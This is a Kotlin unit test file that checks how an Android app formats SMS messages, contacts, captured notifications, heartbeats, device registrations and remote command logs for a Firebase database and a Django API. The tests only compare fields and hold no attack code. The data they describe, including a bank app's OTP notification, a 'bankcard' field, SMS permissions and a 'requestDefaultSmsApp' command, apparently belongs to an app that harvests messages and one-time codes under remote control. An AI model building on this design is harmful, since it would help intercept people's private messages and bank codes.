package com.example.fast.util

import com.example.fast.model.Contact
import com.example.fast.model.ChatMessage
import com.example.fast.model.Phone
import com.example.fast.model.Email
import com.google.common.truth.Truth.assertThat
import org.junit.Test
import org.mockito.kotlin.mock
import java.util.*

/**
 * Unit tests for Django↔Firebase data format consistency
 *
 * Tests ensure that data converted for Firebase storage matches the format
 * expected by Django API endpoints, maintaining consistency across systems.
 */
class DataConversionTest {

    private val deviceId = "test_device_123"
    private val timestamp = System.currentTimeMillis()

    @Test
    fun `test message format consistency between Firebase and Django`() {
        // Create test message
        val message = ChatMessage().apply {
            address = "+1234567890"
            body = "Test message content"
            timestamp = timestamp
            isReceived = true
            isRead = false
        }

        // Convert to Firebase format (from FirebaseSyncHelper)
        val firebaseFormat = convertMessageToFirebaseFormat(message)

        // Convert to Django format (from DjangoApiHelper)
        val djangoFormat = convertMessageToDjangoFormat(message)

        // Verify timestamp consistency
        assertThat(firebaseFormat.keys.first()).isEqualTo(timestamp.toString())
        assertThat(djangoFormat["timestamp"]).isEqualTo(timestamp)

        // Verify phone number consistency
        assertThat(firebaseFormat.values.first()).contains("+1234567890")
        assertThat(djangoFormat["phone"]).isEqualTo("+1234567890")

        // Verify message body consistency
        assertThat(firebaseFormat.values.first()).contains("Test message content")
        assertThat(djangoFormat["body"]).isEqualTo("Test message content")

        // Verify message type consistency
        assertThat(firebaseFormat.values.first()).startsWith("received~")
        assertThat(djangoFormat["message_type"]).isEqualTo("received")

        // Verify device ID is included in Django format
        assertThat(djangoFormat["device_id"]).isEqualTo(deviceId)
    }

    @Test
    fun `test sent message format consistency`() {
        val message = ChatMessage().apply {
            address = "+0987654321"
            body = "Reply message"
            timestamp = timestamp
            isReceived = false
            isRead = true
        }

        val firebaseFormat = convertMessageToFirebaseFormat(message)
        val djangoFormat = convertMessageToDjangoFormat(message)

        // Verify sent message type
        assertThat(firebaseFormat.values.first()).startsWith("sent~")
        assertThat(djangoFormat["message_type"]).isEqualTo("sent")

        // Verify read status
        assertThat(djangoFormat["read"]).isEqualTo(true)
    }

    @Test
    fun `test contact format consistency between Firebase and Django`() {
        // Create test contact
        val contact = Contact().apply {
            id = "contact_123"
            name = "John Doe"
            displayName = "John"
            phoneNumber = "+1234567890"
            photoUri = "content://contacts/123"
            company = "ACME Inc"
            jobTitle = "Engineer"
            lastContacted = timestamp
            timesContacted = 5
            isStarred = true
        }

        // Convert to Firebase format
        val firebaseFormat = convertContactToFirebaseFormat(contact)

        // Convert to Django format
        val djangoFormat = convertContactToDjangoFormat(contact)

        // Verify phone number as key in Firebase, field in Django
        assertThat(firebaseFormat.keys).containsExactly("+1234567890")
        assertThat(djangoFormat["phone_number"]).isEqualTo("+1234567890")

        // Verify basic contact info consistency
        val firebaseContactData = firebaseFormat["+1234567890"]!!
        assertThat(firebaseContactData["name"]).isEqualTo("John Doe")
        assertThat(djangoFormat["name"]).isEqualTo("John Doe")

        assertThat(firebaseContactData["displayName"]).isEqualTo("John")
        assertThat(djangoFormat["display_name"]).isEqualTo("John")

        assertThat(firebaseContactData["company"]).isEqualTo("ACME Inc")
        assertThat(djangoFormat["company"]).isEqualTo("ACME Inc")

        // Verify timestamps
        assertThat(firebaseContactData["lastContacted"]).isEqualTo(timestamp)
        assertThat(djangoFormat["last_contacted"]).isEqualTo(timestamp)

        // Verify device ID in Django format
        assertThat(djangoFormat["device_id"]).isEqualTo(deviceId)
    }

    @Test
    fun `test contact with multiple phones format consistency`() {
        val contact = Contact().apply {
            id = "contact_multi_phone"
            name = "Jane Smith"
            phoneNumber = "+1234567890" // Primary phone
            phones = listOf(
                Phone().apply {
                    number = "+1234567890"
                    type = "mobile"
                    isPrimary = true
                },
                Phone().apply {
                    number = "+0987654321"
                    type = "home"
                    isPrimary = false
                }
            )
        }

        val firebaseFormat = convertContactToFirebaseFormat(contact)
        val djangoFormat = convertContactToDjangoFormat(contact)

        // Verify Firebase uses primary phone as key
        assertThat(firebaseFormat.keys).containsExactly("+1234567890")

        // Verify phones array in both formats
        val firebaseContactData = firebaseFormat["+1234567890"]!!
        @Suppress("UNCHECKED_CAST")
        val firebasePhones = firebaseContactData["phones"] as List<Map<String, Any>>
        assertThat(firebasePhones).hasSize(2)

        @Suppress("UNCHECKED_CAST")
        val djangoPhones = djangoFormat["phones"] as List<Map<String, Any>>
        assertThat(djangoPhones).hasSize(2)

        // Verify phone details consistency
        assertThat(firebasePhones[0]["number"]).isEqualTo("+1234567890")
        assertThat(djangoPhones[0]["number"]).isEqualTo("+1234567890")

        assertThat(firebasePhones[0]["isPrimary"]).isEqualTo(true)
        assertThat(djangoPhones[0]["isPrimary"]).isEqualTo(true)
    }

    @Test
    fun `test notification format consistency`() {
        val notificationData = mapOf(
            "package_name" to "com.bank.app",
            "title" to "OTP Received",
            "text" to "Your OTP is 123456",
            "timestamp" to timestamp,
            "extra" to mapOf("importance" to "high")
        )

        // Firebase would store notifications under device/{id}/notifications
        val firebasePath = "device/$deviceId/notifications/$timestamp"
        val firebaseData = notificationData

        // Django format requires device_id injection
        val djangoData = notificationData.toMutableMap()
        djangoData["device_id"] = deviceId

        // Verify consistency
        assertThat(firebaseData["package_name"]).isEqualTo(djangoData["package_name"])
        assertThat(firebaseData["title"]).isEqualTo(djangoData["title"])
        assertThat(firebaseData["text"]).isEqualTo(djangoData["text"])
        assertThat(firebaseData["timestamp"]).isEqualTo(djangoData["timestamp"])
        assertThat(djangoData["device_id"]).isEqualTo(deviceId)

        // Verify extra data consistency
        @Suppress("UNCHECKED_CAST")
        val firebaseExtra = firebaseData["extra"] as Map<String, Any>
        @Suppress("UNCHECKED_CAST")
        val djangoExtra = djangoData["extra"] as Map<String, Any>
        assertThat(firebaseExtra["importance"]).isEqualTo(djangoExtra["importance"])
    }

    @Test
    fun `test heartbeat data format consistency`() {
        val heartbeatData = mapOf(
            "t" to timestamp,
            "b" to 85
        )

        // Firebase heartbeat path: hertbit/{deviceId}
        val firebasePath = "hertbit/$deviceId"
        val firebaseData = heartbeatData

        // Django PATCH format for heartbeat
        val djangoData = mapOf(
            "last_seen" to timestamp,
            "battery_percentage" to 85
        )

        // Verify timestamp consistency (different field names, same value)
        assertThat(firebaseData["t"]).isEqualTo(djangoData["last_seen"])
        assertThat(firebaseData["b"]).isEqualTo(djangoData["battery_percentage"])
    }

    @Test
    fun `test device registration data format consistency`() {
        val deviceData = mapOf(
            "currentPhone" to "+1234567890",
            "code" to "ABCD1234",
            "isActive" to true,
            "time" to timestamp,
            "batteryPercentage" to 85,
            "currentIdentifier" to "SIM_1",
            "bankcard" to "VISA",
            "system_info" to mapOf("permissionStatus" to mapOf("sms" to true)),
            "app_version_code" to 30,
            "app_version_name" to "3.0"
        )

        // Firebase device path: fastpay/{deviceId}
        val firebaseData = deviceData.toMutableMap()
        firebaseData["device_id"] = deviceId
        firebaseData["is_active"] = true // Boolean conversion
        firebaseData["last_seen"] = timestamp // Map time to last_seen

        // Django POST /devices/ format
        val djangoData = mapOf(
            "device_id" to deviceId,
            "model" to "Test Device", // Would come from Build.MODEL
            "phone" to "+1234567890",
            "code" to "ABCD1234",
            "is_active" to true,
            "last_seen" to timestamp,
            "battery_percentage" to 85,
            "current_phone" to "+1234567890",
            "current_identifier" to "SIM_1",
            "time" to timestamp,
            "bankcard" to "VISA",
            "system_info" to mapOf("permissionStatus" to mapOf("sms" to true)),
            "app_version_code" to 30,
            "app_version_name" to "3.0"
        )

        // Verify key fields consistency
        assertThat(djangoData["device_id"]).isEqualTo(firebaseData["device_id"])
        assertThat(djangoData["phone"]).isEqualTo(firebaseData["currentPhone"])
        assertThat(djangoData["code"]).isEqualTo(firebaseData["code"])
        assertThat(djangoData["is_active"]).isEqualTo(firebaseData["is_active"])
        assertThat(djangoData["last_seen"]).isEqualTo(firebaseData["last_seen"])
        assertThat(djangoData["battery_percentage"]).isEqualTo(firebaseData["batteryPercentage"])
    }

    @Test
    fun `test command logging format consistency`() {
        val commandData = mapOf(
            "command" to "requestDefaultSmsApp",
            "value" to "true",
            "status" to "executed",
            "received_at" to timestamp,
            "executed_at" to timestamp + 1000,
            "error_message" to "request_ui_launched"
        )

        // Firebase command history path: device/{deviceId}/commandHistory
        val firebasePath = "device/$deviceId/commandHistory/$timestamp/requestDefaultSmsApp"
        val firebaseData = mapOf(
            "status" to "executed",
            "executed_at" to timestamp + 1000
        )

        // Django POST /command-logs/ format
        val djangoData = commandData.toMutableMap()
        djangoData["device_id"] = deviceId

        // Verify consistency
        assertThat(djangoData["command"]).isEqualTo("requestDefaultSmsApp")
        assertThat(djangoData["value"]).isEqualTo("true")
        assertThat(djangoData["status"]).isEqualTo(firebaseData["status"])
        assertThat(djangoData["executed_at"]).isEqualTo(firebaseData["executed_at"])
        assertThat(djangoData["device_id"]).isEqualTo(deviceId)
    }

    @Test
    fun `test timestamp consistency across all data types`() {
        val testTimestamp = System.currentTimeMillis()

        // Verify timestamp is stored consistently
        val messageTimestamp = testTimestamp
        val contactTimestamp = testTimestamp
        val notificationTimestamp = testTimestamp
        val heartbeatTimestamp = testTimestamp

        // All timestamps should be the same type (Long) and value
        assertThat(messageTimestamp).isEqualTo(contactTimestamp)
        assertThat(contactTimestamp).isEqualTo(notificationTimestamp)
        assertThat(notificationTimestamp).isEqualTo(heartbeatTimestamp)
        assertThat(heartbeatTimestamp).isInstanceOf(Long::class.java)
    }

    // Helper methods to simulate data conversion (mirroring actual implementation)

    private fun convertMessageToFirebaseFormat(message: ChatMessage): Map<String, String> {
        val messagesMap = mutableMapOf<String, String>()
        val timestamp = message.timestamp.toString()
        val value = if (message.isReceived) {
            "received~${message.address}~${message.body}"
        } else {
            "sent~${message.address}~${message.body}"
        }
        messagesMap[timestamp] = value
        return messagesMap
    }

    private fun convertMessageToDjangoFormat(message: ChatMessage): Map<String, Any?> {
        return mapOf(
            "device_id" to deviceId,
            "message_type" to if (message.isReceived) "received" else "sent",
            "phone" to message.address,
            "body" to message.body,
            "timestamp" to message.timestamp,
            "read" to message.isRead
        )
    }

    private fun convertContactToFirebaseFormat(contact: Contact): Map<String, Map<String, Any?>> {
        val contactsMap = mutableMapOf<String, Map<String, Any?>>()

        if (contact.phoneNumber.isNotBlank()) {
            val contactData = mutableMapOf<String, Any?>(
                "id" to contact.id,
                "name" to contact.name,
                "displayName" to contact.displayName,
                "phoneNumber" to contact.phoneNumber,
                "photoUri" to contact.photoUri,
                "company" to contact.company,
                "jobTitle" to contact.jobTitle,
                "lastContacted" to contact.lastContacted,
                "timesContacted" to contact.timesContacted,
                "isStarred" to contact.isStarred
            )

            if (contact.phones.isNotEmpty()) {
                contactData["phones"] = contact.phones.map { phone ->
                    mapOf(
                        "number" to phone.number,
                        "type" to phone.type,
                        "isPrimary" to phone.isPrimary
                    )
                }
            }

            contactsMap[contact.phoneNumber] = contactData
        }

        return contactsMap
    }

    private fun convertContactToDjangoFormat(contact: Contact): Map<String, Any?> {
        return mapOf(
            "device_id" to deviceId,
            "id" to contact.id,
            "name" to contact.name,
            "display_name" to contact.displayName,
            "phone_number" to contact.phoneNumber,
            "photo_uri" to contact.photoUri,
            "company" to contact.company,
            "job_title" to contact.jobTitle,
            "last_contacted" to contact.lastContacted,
            "times_contacted" to contact.timesContacted,
            "is_starred" to contact.isStarred,
            "phones" to contact.phones.map { phone ->
                mapOf(
                    "number" to phone.number,
                    "type" to phone.type,
                    "is_primary" to phone.isPrimary
                )
            }
        )
    }
}
